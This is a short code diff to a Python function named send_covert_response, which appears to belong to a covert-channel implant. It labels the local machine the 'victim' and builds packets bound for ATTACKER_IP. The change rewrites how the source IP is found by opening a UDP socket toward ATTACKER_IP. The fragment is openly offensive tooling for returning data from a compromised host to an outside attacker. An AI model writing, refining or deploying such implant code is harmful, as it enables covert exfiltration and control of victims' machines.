@@ -258,7 +258,10 @@ def send_covert_response(data_bytes):
     if len(message) % 2 != 0:
         message += b'\x00'
     # Use victim (this host) IP as source
-    src_ip = socket.gethostbyname(socket.gethostname())
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    s.connect((ATTACKER_IP, 0))
+    src_ip = s.getsockname()[0]
+    s.close()
     dst_ip = ATTACKER_IP
     src_addr = socket.inet_aton(src_ip)
     dst_addr = socket.inet_aton(dst_ip)
